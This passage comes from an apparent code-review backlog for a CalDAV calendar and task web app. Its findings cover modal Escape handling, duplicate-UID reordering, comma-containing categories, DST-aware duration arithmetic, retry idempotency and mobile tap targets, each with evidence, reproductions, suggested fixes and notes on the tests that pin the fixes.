critical write the brief calls out — and it is the reason the false-empty state above
(finding 1) survived while its sibling ArchivedCalendarsSection got both the fix and
three regression tests in backlog.aug19.stage4b.test.tsx.

<details><summary>Evidence</summary>

```
$ ls frontend/src/components/*.test.tsx | grep -i connection    # no output
$ grep -rn "mcpConnections" frontend/src --include=*.test.tsx
src/App.test.tsx:51:  m.mcpConnections.mockResolvedValue([])
src/backlog.aug19.stage3.test.tsx:93:  m.mcpConnections.mockResolvedValue([])
src/components/SettingsMenu.test.tsx:28:  m.mcpConnections.mockResolvedValue([])
$ grep -rn "mcpDisconnect\|Nothing is connected\|conn-actions" frontend/src --include=*.test.tsx   # no output

Untested behaviour that is easy to break: `disconnect` restores the previous rows when `guard(() => api.mcpDisconnect(id))` returns undefined — but `mcpDisconnect` is a DELETE and `j()` returns `null` for a 204, so the success/failure discrimination hangs on `null !== undefined`. One change to the endpoint's status code (204 -> 200 with a body, or vice versa) silently inverts the rollback, and nothing would fail.
```

</details>

**Suggested fix.** Add frontend/src/components/ConnectionsSection.test.tsx covering: a rejected list fetch
shows an error rather than "Nothing is connected"; a non-array payload likewise; the
two-tap confirm (Keep restores, Disconnect calls api.mcpDisconnect with the family_id);
a 204 disconnect removes the row and does NOT restore it; a rejected disconnect puts the
row back; and `what()` mapping mcp:write / mcp:read / '' to the three labels.

#### [x] The calendar's event editor breaks the modal contract: no Escape, and a bare onClick scrim discards the whole form
`frontend/src/components/CalendarView.tsx:932` · **medium** · rendering

`EventModal` — the calendar tab's only editor for creating/editing/deleting events — is
the one dialog left in the app that neither imports `useEscape` nor uses the two-event
scrim guard every other dialog adopted. Its scrim is `<div className="overlay"
onClick={onClose}>`, so a mouse-up anywhere on the backdrop closes it and throws away
everything typed, and Escape does nothing at all despite `role="dialog" aria-
modal="true"` and no focus trap. The `moveAsk` scope prompt at line 756 has the same
bare scrim plus no role/aria-label at all. The existing guard test
(`backlog.aug19.stage4b.test.tsx:1177`, 'every component using useEscape is covered by
this file') greps for components that ALREADY import the hook, so it is structurally
incapable of catching a dialog that never adopted it.

<details><summary>Evidence</summary>

```
CalendarView.tsx:932 `<div className="overlay" onClick={onClose}>` and no `useEscape` import anywhere in the file (`grep useEscape src/components/CalendarView.tsx` -> nothing). Compare TaskModal.tsx:122/128-133, which does `useEscape(onClose)` plus `onMouseDown` recording `scrimPress` and only closing when both press and release land on the scrim.

Reproduced against the real component (vitest, jsdom):
  1. open an event chip -> dialog 'Event'; fireEvent.keyDown(window, {key:'Escape'})
     -> logged: `after Escape, dialog still open? true`
  2. open the dialog, type into Notes, then mouseDown on the Notes textarea and
     mouseUp+click on the scrim (exactly what a text drag-select that overshoots
     the modal edge produces)
     -> logged: `after drag-select, dialog still open? false` — title, times,
        location, notes, tags and the calendar pick are all gone, silently.
```

</details>

**Suggested fix.** Copy TaskModal's pattern verbatim into EventModal: `useEscape(onClose)` plus the
`scrimPress` ref with `onMouseDown`/`onClick` on the overlay. Give the `moveAsk` overlay
the same treatment plus `role="dialog" aria-modal="true" aria-label="Repeating event"`.
Then strengthen the stage4b enumeration test so it walks every `className="overlay"` /
`role="dialog"` site rather than only the components that already import the hook.

#### [x] Drag-to-reorder resolves the dragged row by bare uid, so with one UID in two lists the wrong row moves — and that order is POSTed for the whole account
`frontend/src/data.tsx:591` · **medium** · bug · stage 3

`TasksView`'s drop handler carefully resolves both `taskKey`s back to real rows and then
throws the disambiguation away, passing bare uids to `reorder`, which re-finds them with
`placed.findIndex((t) => t.uid === uid)` — first-wins across the merged multi-list
array. The trust model treats a VTODO copied between lists in
Tasks.org/DAVx5/Thunderbird as ordinary (the UID is preserved; the backend keys on
`(collection_href, uid)`), so the copy that sorts first is the one that moves. The
comment at TasksView.tsx:158-160 claims the rows are 'resolved back before the wire
call', but `reorder`'s signature only takes uids, so nothing is actually resolved.
`reorder` renumbers `sort_order` for every task on the account and POSTs it, so the
wrong order is persisted permanently.

<details><summary>Evidence</summary>

```
data.tsx:588-596
```ts
const reorder = async (uid: string, target: string) => {
  if (uid === target) return
  const placed = sortTasks(tasks)
  const from = placed.findIndex((t) => t.uid === uid)
  const to = placed.findIndex((t) => t.uid === target)
```
TasksView.tsx:161-163 `const a = ... find(taskKey(t) === dragged); ... if (a && b) void reorder(a.uid, b.uid)`

Reproduced against the real components (vitest, jsdom). Lists: Home(l1) holds uid X titled 'A home copy' and uid b titled 'B second'; Work(l2) holds a COPY of uid X titled 'C work copy'.
  before: ['A home copy', 'B second', 'C work copy']
  gesture: drag 'C work copy' (uid X, list l2) and drop it on 'B second' (uid b)
  POSTed order: [{"list":"l1","uid":"b"},{"list":"l1","uid":"X"},{"list":"l2","uid":"X"}]
  after:  ['B second', 'A home copy', 'C work copy']
The row the user dragged never moved; an unrelated row in a different list did, and that sequence was written to POST /api/tasks/reorder.

Second manifestation, same cause: dropping the Work copy onto the Home copy calls `reorder('X','X')`, hits the `uid === target` early return, and the drag silently does nothing.

TasksView.test.tsx's whole 'drag-to-reorder' block uses distinct uids, so nothing fails.
```

</details>

**Suggested fix.** Widen `TaskData.reorder` to take the rows (or `taskKey`s) rather than uids — `reorder:
(from: Task, target: Task)` — and inside it use `placed.findIndex((t) => taskKey(t) ===
taskKey(from))`. Add a TasksView test with the same uid in two lists asserting that the
dragged row is the one that moves and that the POSTed sequence matches the on-screen
order.

**Pinned by** `2026-08-25 — reordering with one uid in two lists > moves the row the user dragged, not the first one sharing its uid` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with the suggested fix: `TaskData.reorder` now takes the ROWS (`(from: Task, target: Task)`) and matches with `taskKey`, so `TasksView` hands over the disambiguation it had already done instead of discarding it. `taskKey` is the identity `patchLocal`, `settle`, `sortTasks` and this function's own rollback snapshot already use, for the reason all four comments give: the backend keys items on `(collection_href, uid)`, so a uid copied into a second list is two tasks.

**The `uid === target` early return moved to keys with the rest**, which is the entry's second manifestation and had no pin. Leaving it on the bare uid closes the finding and leaves a drop of one copy onto the other silently doing nothing; `moves one copy onto the other, which share a uid` now asserts it, with a control that a row dropped on ITSELF still writes nothing.

**The TARGET lookup needed a test of its own.** In both the pin's scenario and the second manifestation, the duplicated uid's first occurrence IS the row being dropped on, so keying only the DRAGGED lookup passes everything — a mutation proved it. `drops onto the second copy sharing a uid, not the first` drops onto the later copy, where the two answers differ.

**One deliberate test edit**, recorded here as Stage 2's were: `backlog.stage4.test.tsx:160` calls `d.reorder` directly and now passes two `task({…})` rows instead of `'b', 'a'`. Only the argument shape changed — the tasks named, the gesture, and every assertion in that test are untouched.

#### [x] Any save from the event editor splits a CATEGORIES value containing a comma into two tags
`frontend/src/components/CalendarView.tsx:889` · **medium** · bug · stage 3

`EventModal` holds tags as one comma-joined string and re-splits it on every commit, and
`commit()` sends `tags: tagList()` unconditionally — even for a save that only changed
the title. `CATEGORIES:Home\,Garden` is a single category per RFC 5545 (the backend
reads it correctly via icalendar's `.cats` and writes it back escaped via
`todo.add("CATEGORIES", list(cats))`), so a category another CalDAV client authored with
a comma in it is silently destroyed by an edit that never touched the tags field. This
is exactly the defect the task side was fixed for — AddMultipleModal's `TagInput`
docstring spells it out ('any delimiter-joined text field corrupts it') and TasksView
has a regression test ('keeps a category containing a comma whole') — but the event
editor was never converted.

<details><summary>Evidence</summary>

```
CalendarView.tsx:821 `const [tags, setTags] = useState((e?.tags || []).join(', '))`
CalendarView.tsx:889 `const tagList = () => tags.split(',').map((s) => s.trim()).filter(Boolean)`
CalendarView.tsx:903 `const details = { summary, location, description, tags: tagList() }` — sent on every save path.
app.py:889 `if "tags" in fs: kw["categories"] = req.tags`, so the split really reaches the VEVENT.

Reproduced against the real component (vitest, jsdom). Event with `tags: ['Home,Garden', 'Errands']`:
  tags field shows: `Home,Garden, Errands`
  change only the Title to 'Renamed' and press Save
  PATCH body tags: ["Home","Garden","Errands"]
One category has become two, permanently, on a pure rename.
```

</details>

**Suggested fix.** Reuse `TagInput` from AddMultipleModal for the event editor's Tags field (it already
holds each category whole and is exported), and — like TaskModal — only include `tags`
in the PATCH body when it differs from `e.tags` by value (`sameValue` in util.ts). Add a
CalendarView test that renames an event whose tags contain a comma and asserts the PATCH
omits `tags` entirely.

**Pinned by** `2026-08-25 — the event editor > keeps a category containing a comma whole across an unrelated save` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** in BOTH halves, as decided at the top of the stage. `tags` is held as a `string[]` and the comma-joined text field is replaced by the shared `TagInput` from AddMultipleModal — the same chip control the task side was converted to, whose docstring says why ("any delimiter-joined text field corrupts it"). And `commit` sends `tags` only when they differ from `e.tags` by value (`sameValue`, TaskModal's precedent).

**The two halves defend different things, and a mutation showed the second is not redundant.** Once tags are held whole, sending them on every save is harmless to the VALUE — the array is identical either way — so dropping `sameValue` passes the pin, which explicitly accepts either repair. What it is not harmless to is the WIRE: a pure rename that carries `tags` rewrites CATEGORIES on the server and overwrites a tag edit another CalDAV client made since the modal opened. `sends no tags at all on a save that did not touch them` pins that, and `keeps a comma-bearing category whole while the owner adds another tag` pins the other direction — omitting unchanged tags alone still splits the category the moment the user adds one beside it.

**One deliberate test edit**: the control `still sends the tags when the user edits them` types `Admin{Enter}` into the chip control instead of rewriting a comma-joined string, which is the affordance the suggested fix asks for and how `TasksView.test.tsx` drives the same control. What it asserts is unchanged.

#### [x] endFromDuration treats P1D/P1W as exact milliseconds, so a DAVx5 DURATION-only event silently gains (or loses) an hour across a DST edge on any save
`frontend/src/calendar.ts:72` · **medium** · bug · stage 3

RFC 5545 §3.3.6 makes the weeks/days part of a DURATION *nominal* (P1D means the same
wall-clock time the next day, i.e. 23 or 25 real hours across a transition) and only the
time part exact. The backend implements exactly this split —
`ical/read.py:split_duration` + `advance()`, with an explicit comment — but `durationMs`
folds weeks and days into fixed `86400000` ms and `endFromDuration` adds the whole thing
to the instant. `EventModal` seeds its End picker from `endFromDuration` for the
DURATION-only events DAVx5/jtx Board write, and `commit()` sends `end: endOut` on every
save; `_apply_event_fields` deletes DURATION whenever a dtend is supplied. So the
fabricated end is written and the original span is gone — the precise outcome the
`endUnknown`/`derivedEnd` machinery was added to prevent.

<details><summary>Evidence</summary>

```
calendar.ts:72
```ts
const ms = (Number(w || 0) * 7 + Number(dd || 0)) * 86400000
  + Number(hh || 0) * 3600000 + ...
```
calendar.ts:88 `const out = new Date(d.getTime() + ms)` — instant arithmetic, no wall-clock half.

Reproduced against the real component (vitest, TZ=America/New_York, spring-forward 2026-03-08 02:00). Event: DTSTART 2026-03-07T09:00:00, DURATION:P1D, DTEND absent.
  End picker shows: 2026-03-08T10:00   (RFC says 2026-03-08T09:00)
  change only the Title, press Save ->
  PATCH start/end: 2026-03-07T09:00  2026-03-08T10:00
The event is now an hour longer than its author wrote it, its DURATION is deleted, and the frontend and backend now disagree about the same event's end. `DURATION:P1W` from the same start shows 2026-03-14T10:00 instead of ...T09:00. Across a fall-back the same code shortens the event by an hour instead.
backlog.aug19.stage4a.test.tsx:560-577 drives `durationMs`/`endFromDuration` only with PT-style exact durations and one overflow case — no nominal duration, and none crossing a transition.
```

</details>

**Suggested fix.** Split the duration the way the backend does: return `{nominalDays, exactMs}` from
`durationMs`, and in `endFromDuration` apply the nominal half with `addDays(d,
nominalDays)` (wall clock, DST-safe, same helper `shiftYmd` already uses) before adding
`exactMs` to the resulting instant. Add table tests for P1D/P1W/P1DT2H spanning both
2026-03-08 and 2026-11-01.

**Pinned by** `2026-08-25 — the event editor > seeds and saves a nominal DURATION at the same wall clock` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with the suggested fix's split, placed so that `durationMs` keeps both its name and its tests. A new `splitDuration` is the ONE parser and returns `{nominalDays, exactMs}`; `durationMs` is a thin wrapper over it (`nominalDays * 86400000 + exactMs`), so its exact-milliseconds contract, its overflow refusal and the aug19 stage4a control asserting `durationMs('P1D') === 86400000` are all untouched — no test edit was needed. `endFromDuration` uses `splitDuration`: `addDays` for the nominal half (wall clock), then `+ exactMs` on the resulting instant.

**The stage plan asked for the caller list to decide this, and it did.** `endFromDuration` is `durationMs`'s only production caller — everything else importing it is a test — so changing the shape outright was open. Wrapping instead avoids two parsers that can drift, and keeps a function whose name promises milliseconds from returning something else.

**Order, not just arithmetic.** Nominal first, then exact — the same order `read.py::advance` uses ("wall clock, then…"), and the reason the two cannot be added together. It is only observable in one shape, and a mutation swapping them passed the pin, the control and five of the six table rows: `P1DT2H` starting an hour BEFORE spring-forward is 03:00 the next day when the day-step comes first, and 04:00 when the two elapsed hours cross the skipped hour first. That row is now in the table with the reasoning above it.

**The table covers fall-back too**, which the pin does not: it spans only spring-forward, where a nominal day is 23 h, so hard-coding 23 would pass it. `P1D` and `P1W` across 2026-11-01 assert the 25 h side.

**The overflow guard is checked on the MILLISECONDS, not on the day count.** aug19's control uses a 400-digit day count, which `Number` turns straight into `Infinity`, so a guard reading only the days passes it — a mutation proved that too. The threshold that matters starts around 304 digits, where the days are finite and their milliseconds are not, and that boundary now has a test.

#### [x] Retrying the add box after a failed day-entry POST creates a second real task on the CalDAV list
`frontend/src/components/TodayView.tsx:1236` · **medium** · bug · stage 3

`addParsedTask` is a two-step compound write with no idempotency across the pair and no
compensation: it first authors a real VTODO with `create(...)`, then points the day at
it with `addTask(on, t)` (POST /api/day/{day}/entries). If only the second call fails,
the VTODO is already on the list, `commit` puts the typed line back in the box (its own
comment: "so a rejected line is never simply lost"), and the obvious retry mints a
brand-new `client_id` in `data.tsx::create` — authoring a SECOND identical VTODO that
syncs to Tasks.org / Thunderbird / DAVx5. This is a different trigger from the already-
fixed bulk-composer finding: there the create's response was lost; here the create was
acknowledged and only the day write failed, so no client_id reuse could have helped.

<details><summary>Evidence</summary>

```
TodayView.tsx:1236-1248
```
const addParsedTask = async (
  on: string, list: string, p: ParsedEntry, dated: boolean,
): Promise<boolean> => {
  const t = await create(list, {
    summary: p.summary,
    ...(dated ? { due: dueFromParse(p, on) } : {}),
  })
  if (!t) return false                 // `create` has already raised the toast
  return addTask(on, t)
}
```
and TodayView.tsx:1201-1234 `commit()` → `if (!ok) setText(raw)`; data.tsx:320-323 `const create = async (listId, body, after) => { ... const cid = clientId() ... }` — a fresh id on every call.

Reproduced against the repo's own harness (vitest/jsdom, api module mocked as the suite does): `m.addDayEntry.mockRejectedValueOnce(new Error('nope'))`, type `invoice friday` + Enter, wait for the line to reappear in the box, press Enter again. `createTask` mock calls:
  ["l1", {"summary":"invoice","due":"2026-08-28","client_id":"b9bbbba6672e4fbabe4abbd07af85b88"}]
  ["l1", {"summary":"invoice","due":"2026-08-28","client_id":"e1953a6d5406468989432b8ede3c3a97"}]
Two distinct client_ids → two real tasks "invoice" due 2026-08-28 on list l1, one of which is on no day at all.
```

</details>

**Suggested fix.** Mint the create's `client_id` once per typed line (hold it in a ref keyed by the
restored text, or accept an explicit `client_id` in `create`) so the retry is answered
by the resource already written; and/or, when the day-entry POST fails after the task
landed, keep the created task in hand and retry only `addDayEntry` rather than replaying
the whole line.

**Pinned by** `2026-08-25 — the Today add box > does not author a second task when the retry follows a failed day write` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with BOTH halves the suggested fix offers, as decided at the top of the stage, because they defend different failures. `data.tsx::create` now takes an optional `cid` — the shape `createMany` has had all along — and `TodayView` holds a `retry` ref keyed on the typed LINE carrying `{ line, cid, task? }`. A retry of the same line reuses its client_id, so a create whose RESPONSE was lost is answered by the resource already written; and when the task itself landed and only the day write failed, the task is held and the create is SKIPPED, so the retry re-sends only the half that failed.

**The pin takes either repair, and they are not equally good.** Replaying the create makes the retry depend on the backend resolving the client_id to the existing resource; skipping it does not. Both now have their own test, because the "only the day write" test hides the id reuse (the create never runs twice) and the "failed create" test hides the holding.

**The ref's SCOPE needed two more tests, and mutations found both.** It must not outlive the line — fail, retry successfully, retype the same text, and that is a new task, not a second attempt at the finished one (only reachable in three steps, so "never clear on success" passed everything until then) — and it must not cross to another line, or the user who gives up on one line and types a different one gets the day pointed at the abandoned task.

#### [x] The Today tab's drop indicator draws above the target on a downward drag, but the row lands below it
`frontend/src/components/TodayView.tsx:1761` · **medium** · rendering · stage 4

`dragOver` is a single boolean and `.today-row.drag-over` always paints the accent rule
on the row's TOP edge, while `moveRow` deliberately lands a downward drag AFTER the
target. So during every downward drag the line the owner is aiming at is one gap above
where the row will actually go — the exact defect the Tasks pane already fixed with
`drag.below` + `.task-drag.drag-over.drag-below > .task { box-shadow: inset 0 -2px 0 }`
(TasksView.tsx:149, app.css:307). The Today tab's drag is a separate, newer code path
that never got the fix.

<details><summary>Evidence</summary>

```
TodayView.tsx:1761 `dragOver={overId === e.entry_id && dragId !== null && dragId !== e.entry_id}` — no direction. app.css:1614 `.today-row.drag-over { box-shadow: inset 0 2px 0 var(--accent); }` — top edge only, unconditionally. TodayView.tsx:1012-1050 `moveRow`: "Dragging DOWN lands the row AFTER the target", `const before = without[to - 1]; const after = without[to]`.

Measured in the repo's harness with rows Alpha(pos 1) / Bravo(2) / Charlie(3):
  DOWN  (mouseDown+dragStart on Alpha, dragOver+drop on Bravo)
    hovered class: "today-row today-draggable drag-over"   → rule painted at Bravo's TOP
    write: patchDayEntry("2026-08-25","a",{"position":2.5}) → order becomes Bravo, Alpha, Charlie
  UP    (Charlie onto Bravo)
    hovered class: "today-row today-draggable drag-over"
    write: patchDayEntry("2026-08-25","c",{"position":1.5}) → order becomes Alpha, Charlie, Bravo (correct)
The indicator is identical in both directions; only the upward reading matches it.
```

</details>

**Suggested fix.** Compute the direction where `dragOver` is computed — `dayRows.findIndex(dragId) <
dayRows.findIndex(e.entry_id)` — pass it to `TodayRow` as e.g. `dragBelow`, add `today-
below` to the row's class list, and add `.today-row.drag-over.today-below { box-shadow:
inset 0 -2px 0 var(--accent); }` beside the existing rule.

**Pinned by** `2026-08-25 — the Today tab > points at the gap the row will actually land in` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix, which is the pair the Tasks pane already carries: a `dragBelow` prop on `TodayRow`, a `today-below` class, and `.today-row.drag-over.today-below { box-shadow: inset 0 -2px 0 var(--accent) }` beside the existing top-edge rule.

**Computed off `dayRows`, not off a map index.** `renderRow` is shared by eight groups — "today's two and the look-back's six", as its own docstring says — so the index within a group is not the index in the day. `dragIndex` is memoized from `dayRows` and each row compares against its own position there, which is also the form the suggested fix names.

**The pin is deliberately repair-agnostic and therefore cannot check the DIRECTION.** It asserts only that the two drags render differently, so that any honest fix satisfies it — and an INVERTED rule differs just as well, as does one applied to every row at once. Both passed it. A landed fix may name its own shape, so a second test does: `today-below` on the hovered row, on a downward drag only, matching `moveRow`'s documented "dragging DOWN lands the row AFTER the target". A third asserts the CSS rule exists and is on the opposite edge from the plain one — jsdom applies no stylesheet, so a class threaded correctly with no rule behind it is otherwise invisible.

#### [x] Escape discards an unsaved reflection (and an unsaved capacity) because both commit only on blur
`frontend/src/components/ShutdownRitual.tsx:316` · **medium** · bug · stage 3

`ReflectStep` writes the day's reflection only from `onBlur`. Both rituals bind
`useEscape(onClose)` to the window, and `onClose` unmounts the whole overlay. Browsers
do not fire `blur`/`focusout` for a focused element that is removed from the DOM (Chrome
and Safari, i.e. every iOS install), so pressing Escape with the cursor still in the
textarea silently throws the typed prose away — on the one field in the app that holds
free text and whose own hint promises "Kept with the day. You will see it whenever you
look back at today." The ✕ and the scrim are safe (their mousedown blurs the field
first); Escape is the one closer that is not. `PlanRitual`'s `CapacityStep` has the
identical shape at PlanRitual.tsx:192, so "until 6pm" typed and then Escaped is never
stored either.

<details><summary>Evidence</summary>

```
ShutdownRitual.tsx:310-316
```
<textarea id="shut-reflect" ... autoFocus
  value={draft} ...
  onChange={(e) => setDraft(e.target.value)}
  onBlur={() => { if (draft !== (reflection ?? '')) onReflect(draft) }} />
```
ShutdownRitual.tsx:80 `useEscape(onClose)`; TodayView.tsx:2089 `onClose={() => setShutdown(false)}` unmounts the subtree.

Reproduced in the repo's harness: open Shut down → Next → Next, type "shipped the thing" into the field labelled "A note about today", `fireEvent.keyDown(window, { key: 'Escape' })`, wait for the dialog to unmount. `api.patchDay` mock calls: `[]` — nothing was ever sent. Re-opening the ritual shows an empty box and the look-back shows no "How it went" section.
```

</details>

**Suggested fix.** Commit the draft from a cleanup effect as well as from blur (`useEffect(() => () => { if
(draftRef.current !== (reflection ?? '')) onReflect(draftRef.current) }, [])`), or have
`ShutdownRitual`/`PlanRitual` flush their step before calling `onClose`. Same change is
needed for `CapacityStep`.

**Pinned by** `2026-08-25 — the shutdown ritual > keeps a reflection the owner closed with Escape` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with the suggested fix's first form, in BOTH steps the entry names. `ReflectStep` and `PlanRitual`'s `CapacityStep` each gained a cleanup effect that commits on unmount, reading the draft through a ref so it fires once with the LAST value rather than on every keystroke. The effect ADDS a path: blur still commits, which is what the control requires and what keeps the capacity parser's error visible while the ritual is still open.

**`CapacityStep` had no pin**, so fixing only `ReflectStep` closed the finding and left "until 6pm" typed and Escaped exactly as lost as before. It has a test now, and so does the case its `commit` decides differently from the reflection's: the cleanup runs `commit` ITSELF rather than sending the raw draft, so an unmount resolves "until 6pm" against the clock the way a blur would — and a draft the parser REFUSES writes nothing, which is blur's answer too. A mutation flushing a guessed number instead was caught by that control.

**The flush must not DOUBLE-write**, which the pin cannot see: it never blurs. `ReflectStep` compares against a `saved` ref, so the ordinary path — type, tab away, close — sends one PATCH, not two of identical prose against the one field this design deliberately keeps out of a write storm.

#### [x] A failed day read leaves the Today tab blank with no error, no empty state and no retry — and every add then paints nothing
`frontend/src/components/TodayView.tsx:646` · **medium** · rendering · stage 4

`plan` only ever becomes non-null on a successful 200; a rejection is swallowed by
`guard` into a transient toast. `allEntries`/`entries` therefore stay `null` forever,
and every render of the day is gated on `entries !== null` — including the empty state —
so the tab shows the heading, the add box, the calendar strip and the suggestions over a
blank space that says nothing at all, with no way to retry short of navigating away and
back. `POST /api/day/{day}/open` is the expensive call on this screen (it derives a
snapshot from CalDAV), so a Radicale hiccup that 502s/times out that one call while
every other endpoint is healthy is the realistic trigger. In that state every optimistic
writer is a no-op, because they all read `setPlan((p) => (p && …) : p)`: the owner types
a line, presses Add, the POST succeeds server-side, the box clears — and no row appears.

<details><summary>Evidence</summary>

```
TodayView.tsx:621 `const [plan, setPlan] = useState<DayPlan | null>(null)`; :646 `if (p && Array.isArray(p.entries)) setPlan(p)` (nothing on the failure arm); :683 `allEntries = plan && plan.day === day ? … : null`; :2183 the empty state is `{entries !== null && entries.length === 0 && (<p className="empty">Nothing on today yet…`; :1091 and :1120 `setPlan((p) => (p && p.day === on ? {…} : p))`.

Reproduced in the repo's harness with `m.openDay.mockRejectedValue(new Error('boom'))`:
  document.querySelectorAll('.empty') → [ 'Nothing on the calendar today.' ]   (nothing about the day)
  no `N open · N on the day` count, no error region (only `.cal-partial`, which is calendars-only)
  then: type "call the bank", press Add → `api.addDayEntry` IS called, input value becomes '' , and
  document.querySelectorAll('.today-row') → []  — the note is on the server and invisible.
Only a later `day_updated` SSE bump repaints it; a read-only failure with no subsequent event leaves the day blank indefinitely.
```

</details>

**Suggested fix.** Give the read a third state: set an error flag on the failure arm of the effect (`const
p = await …; if (mine !== token.current) return; if (p && Array.isArray(p.entries))
setPlan(p); else setDayError(true)`), render a short "Couldn't load today" line with a
retry button that bumps a local nonce in the effect's deps, and disable/flag the add box
and the suggestion "+" while the day is unknown so a write cannot land invisibly.

**Pinned by** `2026-08-25 — the Today tab > says the day could not be read, and does not swallow the next add` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix: a `dayError` flag set on the failure arm, a "Couldn't read today." line with a Try again button, and the add box disabled while the day is unknown. The catch RE-THROWS after setting the flag, so `guard` still raises its toast and still routes an AuthError to the login card — the flag is what the screen needs, the toast is what a transient blip needs, and they are not alternatives.

**Disabling the add box is not cosmetic.** With `plan` null every optimistic writer here is a no-op (`setPlan((p) => (p && …))`), so an add reached the server, succeeded, and painted nothing. That is the worse half of the finding, and the pin asserts it as `wroteInvisibly`.

**A 200 carrying junk is a failed read too, and said so nowhere.** `if (p && Array.isArray(p.entries)) setPlan(p)` had no `else`, so a malformed body left `plan` null exactly as a rejection did — while `guard`, which shields against a rejection and not against a bad 200, raised no toast either. It now sets the same flag, and has its own test.

**The retry needed a signal of its own**, the same lesson as `reloadTasks` one commit earlier: the effect keys on `day`/`today`/`rev`/`guard`, and `rev` only moves when the SERVER publishes a change — so on a quiet day the blank tab was permanent. The pin is deliberately structural ("the pin does not name the copy") and so cannot check that the retry WORKS; a mutation leaving `dayTry` out of the deps passes it, and fails the recovery test.

#### [x] "That time was just taken" stays on screen after the visitor does what it told them to do
`frontend/src/components/BookingPage.tsx:265` · **low** · rendering · minor · stage 4

The 409 recovery path sets `error`, clears the slot and returns to `pick`. Nothing
clears `error` when a new slot is chosen, so the warn-bordered `role="alert"` banner
"That time was just taken — please pick another." is still rendered above the confirm
bar for the NEW slot, and stays there while the visitor types their name and email and
presses Confirm. It only disappears if the second booking also fails (replaced) or
succeeds (the `done` branch renders instead). An anonymous visitor is being told their
currently-selected slot is gone at the exact moment they are asked to confirm it.

<details><summary>Evidence</summary>

```
```
// submit() 409 path
setError('That time was just taken — please pick another.')
setSlot(null); setPhase('pick'); await load({ keepPhase: true })
...
// slot button — sets slot/cid/phase, never clears error
<button key={s.start} className="slot-btn"
  onClick={() => { setSlot(s); setCid(clientId()); setPhase('confirm') }}>
```
Reproduced: `publicBook` rejects with `HttpError(409, 'that time is not available')`; book slot 1, see "just taken", click slot 2. `document.querySelector('.booking-picked')` is present (confirm phase) AND `document.querySelector('.booking-err').textContent === 'That time was just taken — please pick another.'`
```

</details>

**Suggested fix.** Clear it where the intent changes: `onClick={() => { setError(null); setSlot(s);
setCid(clientId()); setPhase('confirm') }}` (and in the "Change" handler).

**Pinned by** `2026-08-25 — the booking page after a taken slot > clears the warning once the visitor picks another slot` in `frontend/src/backlog.aug25.stage4.test.tsx`.

**Fixed** with the suggested fix verbatim: `setError(null)` on the slot button and in the `Change` handler — the two places the visitor's INTENT changes.

**The `Change` half is reachable only through a DIFFERENT failure, which the test had to be re-aimed at.** The taken-slot 409 already sends the visitor back to the picker itself (`setSlot(null); setPhase('pick')`), so there is no Change button on screen in that state at all. Any other failure — a 502 from the tunnel, a validation refusal — leaves them on the confirm step with the message standing, and Change is the way out. A first draft of the test used the 409 and failed to find the button, which is the finding's own wording (`and in the "Change" handler`) being right about the code and imprecise about the path.

#### [x] The Today row's drop / add / estimate controls are ~18x16px tap targets, though the same media block enlarges the Tasks pane's equivalents
`frontend/src/styles/app.css:1588` · **low** · rendering · minor

`.today-drop`, `.today-plus` and `.today-est` are the per-row controls on the Today tab
and have no rule anywhere inside @media (max-width: 720px) — the whole Today-tab fence
(1355-1884) is outside every media block. They render at their desktop size on a phone:
2px vertical padding on a `line-height: 1` glyph. The mobile block explicitly grows the
Tasks pane's identical controls (`.task-actions button { font-size: calc(12px * …);
padding: 5px 6px }`, line 866) and the drawer's group buttons (line 841), so the
standard exists and Today was left out. `.today-drop` is additionally revealed on touch
by its own `@media (hover: none)` rule at 1601, i.e. it is deliberately meant to be
tapped.

<details><summary>Evidence</summary>

```
app.css:1587
  .today-drop, .today-plus {
    background: none; border: 0; cursor: pointer; flex: none; line-height: 1;
    font-family: var(--mono); font-size: calc(12px * var(--fs-scale));
    color: var(--fg-faint); padding: 2px 4px;
  }
app.css:1596  .today-plus { color: var(--accent); font-size: calc(15px * var(--fs-scale)); }
app.css:1556  .today-est { … padding: 2px 4px; … font-size: calc(11px * var(--fs-scale)); min-width: 42px; }
app.css:1601  @media (hover: none) { .today-drop { opacity: 1; } }

Compare, in the SAME stylesheet's mobile block:
app.css:865-866  .task-actions { gap: 8px; }
                 .task-actions button { font-size: calc(12px * var(--fs-scale)); padding: 5px 6px; }

Consumers: TodayView.tsx:2819 (<button className="today-drop" aria-label={`Remove … from today`}>✕),
TodayView.tsx:2262 (<button className="today-plus">, the only way to accept a suggestion),
TodayView.tsx:2485 (<button className="today-est">).

Failure scenario (iPhone 390x844, default --fs-scale: 1):
  .today-drop computes to 2 + 12 + 2 = 16px tall and 4 + ~10 + 4 = 18px wide —
  about a sixth of the 44x44 minimum — and it is the DESTRUCTIVE control,
  sitting flush against the right edge of a row whose body opens an editor on
  tap. A miss either opens the task or drops it from the day. `.today-plus`
  computes to ~17x19 and `.today-est` to ~42x20.
```

</details>

**Suggested fix.** Add a Today block to the mobile media query mirroring line 866, e.g. `@media (max-width:
720px) { .today-drop, .today-plus { padding: 10px 12px; } .today-est { padding: 10px
6px; } }`, or give the three a shared `min-height: 44px; min-width: 44px` there. The
row's `align-items: center` already absorbs the extra height.

#### [x] The archived-calendar agenda's negative margins are sized for a .modal but it renders inside the settings panel, clipping its colour rules and giving the settings sheet a sideways scroll
`frontend/src/styles/app.css:662` · **low** · rendering · minor · stage 4

`.arch-events { margin: 0 -18px -18px }` cancels a `.modal`'s 18px padding so its rows
can run edge to edge. But the component that renders `.arch-events` is
`ArchivedCalendarsSection`, which SettingsMenu mounts inside `.set-panels` — and the
settings container (`.menu` on desktop, `.settings-menu.set-sheet` on a phone) is padded
14px, not 18px. The block therefore ends up 36px wider than its parent's content box:
18px past the right edge, which turns into scrollable overflow because the ancestor
scroller declares only `overflow-y: auto` (so `overflow-x` computes to `auto`), and 18px
past the left edge, which is unreachable in LTR and simply clipped — taking each row's
calendar-colour rule with it.

<details><summary>Evidence</summary>

```
app.css:662
  .arch-events { max-height: 55vh; overflow-y: auto; margin: 0 -18px -18px; }
app.css:669
  .arch-events .agenda-ev { cursor: default; padding: 9px 18px; font-size: calc(14px * var(--fs-scale)); }
app.css:604 (base)
